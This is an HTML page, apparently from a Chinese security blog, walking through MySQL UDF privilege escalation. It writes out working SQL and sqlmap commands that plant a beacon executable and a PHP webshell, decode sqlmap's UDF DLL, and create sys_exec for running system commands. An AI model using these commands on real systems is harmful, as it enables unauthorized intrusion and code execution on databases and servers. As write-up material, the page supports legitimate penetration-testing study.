@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en_US">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>温故——MySQL数据库UDF提权 - x51&#39;BLOG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="与其感叹路难行，不如马上出发。">
+  
+  
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">x51&#39;BLOG</a>
+    <div class="subtitle">与其感叹路难行，不如马上出发.</div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">温故——MySQL数据库UDF提权</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#UDF"><span class="toc-text">UDF</span></a></li></ol>
+
+  <div class="post-content">
+    <p>update：2019-05-13</p>
+<p>遇到一个案例，在内网扫描到MySQL弱口令（root账户），连接数据库后将beacon以16进制的形式写入到指定目录（目录可通过sqlmap os-shell获得），可在本地MySQL执行：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">'/root/beacon.exe'</span>)) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'root/beacon.txt'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>然后在目标MySQL执行：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0</span>x&#123;beacon.txt&#125; <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\path\\beacon.exe'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>最后在sqlmap的os-shell上运行beacon即可；</p>
+<p>注：通过该方法写入hex数据时注意路径正确，写入文件不易过大，耗时较久；</p>
+<p>使用sqlmap也可以实现udf提权，在一定情况下可选；<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d <span class="string">"mysql://user:pass@192.168.0.1:3306/testdb"</span> --os-<span class="keyword">shell</span><span class="bash"></span></span><br></pre></td></tr></table></figure></p>
+<p>通过执行记录可看到仍然是上传dll文件后创建sys_evel和sys_exec函数来执行系统命令；</p>
+<p>======================</p>
+<p>一个PHP站点，安装了phpmyadmin，root口令已拿到，首先想到的是写shell，然后看webshell权限情况是否需要提权。<br>数据库一些基本参数：<br><img src="/images/pasted-15.png" alt="upload successful"><br>默认安装位置在C盘program files路径（这个路径普通权限无法写入，后续提权会遇到），猜测网站路径也应该是默认部署，即C:/intpub/wwwroot/，可直接向这个路径写文件验证一下，不过后来手工试了一下phpinfo存在，验证路径正确。</p>
+<p><img src="/images/pasted-16.png" alt="upload successful"><br>贴一张mysql文件操作的笔记：<br><img src="/images/pasted-19.png" alt="upload successful"><br>写webshell：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">"..."</span> intofile <span class="string">"C:/intpub/wwwroot/shell.php"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>此处需注意路径中“/”或者“\\”才可以，不要直接复制phpinfo中的“\”。<br>看一下webshell权限：<br><img src="/images/pasted-18.png" alt="upload successful"><br>（SeImpersonatePrivilege开启，看了下端口开放情况应当可以用另一种方法提权，暂且放置）</p>
+<h6 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h6><p>UDF即用户自定义函数，一个包含执行函数的动态链接库，这个dll文件（Windows环境）在SQLMAP安装目录有，x86和x64环境各一份 ：<br><img src="/images/pasted-20.png" alt="upload successful"><br>需要先做一下解码操作：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="regexp">/usr/</span>share<span class="regexp">/sqlmap/</span>extra<span class="regexp">/cloak/</span>cloak.py -d -i <span class="regexp">/usr/</span>share<span class="regexp">/sqlmap/u</span>df<span class="regexp">/mysql/</span>windows<span class="regexp">/32/</span>lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure></p>
+<p>会在同目录生成一份可用dll文件</p>
+<p><img src="/images/pasted-21.png" alt="upload successful"><br>关于选择平台位数的问题，需要在MySQL中确认：</p>
+<p><img src="/images/pasted-22.png" alt="upload successful"><br>这儿要以version_compile_os为准，选64位的dll。<br>如果选择错误会报如下错误：</p>
+<p><img src="/images/pasted-23.png" alt="upload successful"></p>
+<p>准备好udf64.dll文件之后，上传目录也需要选择正确的路径：<br>1、MySQL&gt;5.1，需要放置在mysql安装目录下的plugin文件夹；<br>2、MySQL&lt;5.1，需要放置在system32目录下<br>查看plugin完整路径：<br><img src="/images/pasted-24.png" alt="upload successful"><br>该目录webshell没有写权限，利用MySQL的load_file函数  </p>
+<p><img src="/images/pasted-25.png" alt="upload successful"><br>创建函数sys_exec：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_exec <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">"udf64"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>创建成功之后即可直接select sys_exec来使用；</p>
+<p><img src="/images/pasted-26.png" alt="upload successful"><br>测试完成之后删除函数，删除dll文件；<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_exec;</span><br></pre></td></tr></table></figure></p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-02-23</span>
+  </div>
+
+  <div class="post-footer">
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2020
+  <span class="author">
+    x51
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
